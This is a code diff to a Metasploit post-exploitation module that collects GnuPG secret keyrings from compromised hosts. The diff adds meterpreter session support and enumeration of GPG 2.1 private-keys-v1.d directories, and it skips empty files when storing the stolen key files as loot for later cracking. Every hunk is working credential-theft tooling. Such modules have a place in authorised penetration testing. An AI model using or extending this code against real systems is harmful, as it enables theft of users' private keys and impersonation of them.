@@ -15,9 +15,13 @@ class MetasploitModule < Msf::Post
         machine. Password protected secret keyrings can be cracked with John the Ripper (JtR).
       },
       'License'        => MSF_LICENSE,
-      'Author'         => ['Dhiru Kholia <dhiru[at]openwall.com>'],
+      'Author'         => 
+        [
+          'Dhiru Kholia <dhiru[at]openwall.com>', # Original author
+          'Henry Hoggard' # Add GPG 2.1 keys, stop writing empty files
+        ],
       'Platform'       => %w{ bsd linux osx unix },
-      'SessionTypes'   => ['shell']
+      'SessionTypes'   => ['shell', 'meterpreter']
     ))
   end
 
@@ -31,6 +35,17 @@ class MetasploitModule < Msf::Post
 
     if paths.nil? || paths.empty?
       print_error("No users found with a .gnupg directory")
+      return
+    end
+
+    download_loot(paths)
+
+    print_status("Finding .gnupg >= 2.1 directories")
+    paths = enum_user_directories.map {|d| d + "/.gnupg/private-keys-v1.d"}
+    paths = paths.select { |d| directory?(d) }
+
+    if paths.nil? || paths.empty?
+      print_error("No users found with a .gnupg 2.1 directory")
       return
     end
 
@@ -53,9 +68,13 @@ class MetasploitModule < Msf::Post
         data = read_file(target)
         file = file.split(sep).last
         type = file.gsub(/\.gpg.*/, "").gsub(/gpg\./, "")
-        loot_path = store_loot("gpg.#{type}", "text/plain", session, data,
-          "gpg_#{file}", "GnuPG #{file} File")
-        print_good("File stored in: #{loot_path.to_s}")
+        if data.to_s.empty?
+          vprint_error("No data found for #{file}")
+        else
+          loot_path = store_loot("gpg.#{type}", "text/plain", session, data,
+            "gpg_#{file}", "GnuPG #{file} File")
+          print_good("File stored in: #{loot_path.to_s}")
+        end
       end
 
     end
